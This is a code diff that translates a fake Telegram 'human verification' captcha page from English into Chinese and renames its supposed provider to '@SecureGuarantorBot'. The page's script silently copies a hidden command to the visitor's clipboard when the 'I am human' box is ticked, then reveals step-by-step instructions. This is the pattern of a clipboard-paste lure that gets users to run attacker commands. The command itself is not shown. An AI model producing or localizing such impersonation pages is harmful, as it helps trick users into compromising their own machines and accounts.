@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="zh">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Human Verification</title>
+    <title>人机验证</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -132,24 +132,24 @@
     <div class="card">
         <div class="header">
             <div class="logo">
-                <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/image-DoEe0GtTKR664yJ3mdC3FC6qS7yDtF.png" alt="Telegram Logo">
+                <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/image-DoEe0GtTKR664yJ3mdC3FC6qS7yDtF.png" alt="Telegram 标志">
             </div>
             <div class="title">Telegram</div>
-            <button class="verify-button" style="margin-left: auto;">VERIFY</button>
+            <button class="verify-button" style="margin-left: auto;">验证</button>
         </div>
         <div class="content">
-            <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9IiM0Q0FGNTAiIHN0cm9rZS13aWR0aD0iMiIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIiBjbGFzcz0ibHVjaWRlIGx1Y2lkZS1zaGllbGQiPjxwYXRoIGQ9Ik0xMiAyMnM4LTQgOC0xMFY1bC04LTNsLTggM3Y3YzAgNiA4IDEwIDggMTBaIi8+PC9zdmc+" alt="Shield" class="shield-icon">
-            <h2>Human Verification</h2>
-            <p>Verify your user authenticity by completing the captcha below.</p>
+            <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9IiM0Q0FGNTAiIHN0cm9rZS13aWR0aD0iMiIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIiBjbGFzcz0ibHVjaWRlIGx1Y2lkZS1zaGllbGQiPjxwYXRoIGQ9Ik0xMiAyMnM4LTQgOC0xMFY1bC04LTNsLTggM3Y3YzAgNiA4IDEwIDggMTBaIi8+PC9zdmc+" alt="盾牌" class="shield-icon">
+            <h2>人机验证</h2>
+            <p>通过完成下方的验证码来验证您的用户身份。</p>
             <div class="captcha">
                 <input type="checkbox" id="captcha-checkbox">
-                <span class="captcha-text">I am human</span>
+                <span class="captcha-text">我是人类</span>
                 <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzAiIGhlaWdodD0iMzAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGNpcmNsZSBjeD0iMTUiIGN5PSIxNSIgcj0iMTQiIGZpbGw9IiNFMEUwRTAiLz48dGV4dCB4PSI1MCUiIHk9IjUwJSIgZG9taW5hbnQtYmFzZWxpbmU9Im1pZGRsZSIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZmlsbD0iIzlFOUU5RSIgZm9udC1zaXplPSIxMiIgZm9udC1mYW1pbHk9IkFyaWFsIj5oQzwvdGV4dD48L3N2Zz4=" alt="hCaptcha">
             </div>
-            <div class="powered-by">Powered By: <a href="#">@Safeguard</a></div>
+            <div class="powered-by">技术支持： <a href="#">@SecureGuarantorBot</a></div>
         </div>
         <div class="footer">
-            If you have Telegram, you can contact Safeguard right away.
+            如果您有Telegram，可以立即联系SecureGuarantorBot。
         </div>
         <div class="instructions">
             <h3>完成以下步骤</h3>
@@ -170,9 +170,9 @@
             if (this.checked) {
                 document.querySelector('.instructions').style.display = 'block';
                 navigator.clipboard.writeText(command).then(() => {
-                    console.log('Command copied to clipboard');
+                    console.log('命令已复制到剪贴板');
                 }).catch(err => {
-                    console.error('Failed to copy command: ', err);
+                    console.error('复制命令失败: ', err);
                 });
             } else {
                 document.querySelector('.instructions').style.display = 'none';
@@ -181,9 +181,9 @@
 
         document.querySelector('.verify-button').addEventListener('click', function() {
             if (document.getElementById('captcha-checkbox').checked) {
-                alert('Verification successful!');
+                alert('验证成功！');
             } else {
-                alert('Please complete the captcha first.');
+                alert('请先完成验证码。');
             }
         });
     </script>
